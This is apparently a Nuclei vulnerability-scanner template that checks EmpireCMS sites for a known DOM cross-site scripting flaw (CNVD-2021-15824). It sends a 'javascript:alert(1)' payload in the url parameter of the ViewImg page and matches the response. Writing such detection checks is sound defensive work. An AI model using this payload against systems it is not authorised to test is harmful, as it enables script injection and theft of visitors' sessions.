id: CNVD-2021-15824

info:
  name: EmpireCMS DOM Cross Site-Scripting
  author: daffainfo
  severity: medium
  reference: https://www.bilibili.com/read/cv10441910
  tags: empirecms,cnvd,cnvd2021

requests:
  - method: GET
    path:
      - "{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(1)"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '注:支持鼠标滚轮放大'
          - 'Request("url")'
        condition: and

      - type: status
        status:
          - 200
